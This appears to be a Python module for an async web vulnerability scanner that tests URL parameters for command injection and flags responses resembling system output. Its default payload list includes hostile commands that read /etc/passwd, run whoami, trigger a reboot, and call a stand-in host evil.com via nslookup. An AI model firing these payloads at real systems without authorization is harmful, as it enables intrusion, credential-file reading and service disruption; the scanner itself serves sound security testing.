import asyncio
import aiohttp
import logging
import re
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

logger = logging.getLogger(__name__)

class AsyncCommandInjectionScanner:
    def __init__(self, add_finding_callback):
        self.add_finding_callback = add_finding_callback

    async def scan(self, http_session, base_url, params_to_test=None, payloads=None):
        """
        Checks for Asynchronous Command Injection vulnerabilities.
        :param http_session: The aiohttp client session.
        :param base_url: The base URL of the target.
        :param params_to_test: List of parameter names to test.
        :param payloads: List of command injection payloads.
        """
        if params_to_test is None:
            params_to_test = ["cmd", "exec", "query", "run", "ping", "ip", "host"] # Common parameters
        if payloads is None:
            payloads = [
                "; ls -l", "&& dir",  # Linux and Windows
                "| whoami", "| id",
                "; cat /etc/passwd", "&& type C:\\Windows\\win.ini",
                "$(reboot)", # A payload that might cause obvious disruption or error
                "`reboot`",
                "; nslookup evil.com" # Command that causes external interaction
            ]

        logger.info(f"[*] (CommandInjectionScanner) Starting Command Injection check on: {base_url} for params: {params_to_test}")

        tasks = []
        for param in params_to_test:
            for payload in payloads:
                tasks.append(self._check_single_cmd_injection(http_session, base_url, param, payload))

        await asyncio.gather(*tasks, return_exceptions=True)

    async def _check_single_cmd_injection(self, http_session, base_url, param_name, payload):
        parsed_url = urlparse(base_url)
        original_query_params = parse_qs(parsed_url.query)

        # Add/replace the test parameter
        current_params = original_query_params.copy()
        current_params[param_name] = [payload] # parse_qs stores values in lists

        # Rebuild the query string
        new_query_string = urlencode(current_params, doseq=True)
        test_url = urlunparse(parsed_url._replace(query=new_query_string))

        try:
            # Some payloads might cause long hangs if successful but not outputting, so timeout is important
            async with http_session.get(test_url, timeout=20) as response: # Increased timeout slightly for cmd inj
                response_text = await response.text()
                # Enhanced detection patterns
                # Note: Some patterns are OS specific.
                if "root:x:0:0" in response_text or \
                   re.search(r"uid=\d+\(.*?\)\s+gid=\d+\(.*?\)", response_text) or \
                   "etc/passwd" in response_text or \
                   "Volume Serial Number" in response_text or \
                   "Windows IP Configuration" in response_text or \
                   "Default Gateway" in response_text or \
                   "GNU Privacy Guard" in response_text: # common output from gpg --version, often on linux
                    await self.add_finding_callback("Command Injection", test_url, f"Payload: '{payload}' in param '{param_name}' yielded sensitive info.", severity="Critical")
                else:
                    logger.info(f"[-] (CommandInjectionScanner) No obvious Command Injection at: {test_url} with payload '{payload}'")
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.error(f"(CommandInjectionScanner) Error during Command Injection check for {test_url}: {e}")
        except Exception as e:
            logger.error(f"(CommandInjectionScanner) Unexpected error during Command Injection check for {test_url}: {e}")

# Example of how it might be used (for testing this module standalone)
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)

    async def example_add_finding(vulnerability_type, url, details, severity):
        print(f"[+] FOUND: {vulnerability_type} at {url} - {details} ({severity})")

    async def main():
        async with aiohttp.ClientSession() as session:
            cmd_injection_scanner = AsyncCommandInjectionScanner(add_finding_callback=example_add_finding)
            # Replace with a target known or suspected to be vulnerable to command injection for real testing.
            # Ensure you have permission.
            # Example: await cmd_injection_scanner.scan(session, "http://localhost:8080/vulnerable_app?file=test.txt")
            # await cmd_injection_scanner.scan(session, "http://testphp.vulnweb.com/search.php?test=query") # Unlikely to be vuln here
            logger.info("Command Injection scanner module example run finished.")

    # asyncio.run(main()) # Commented out
    pass
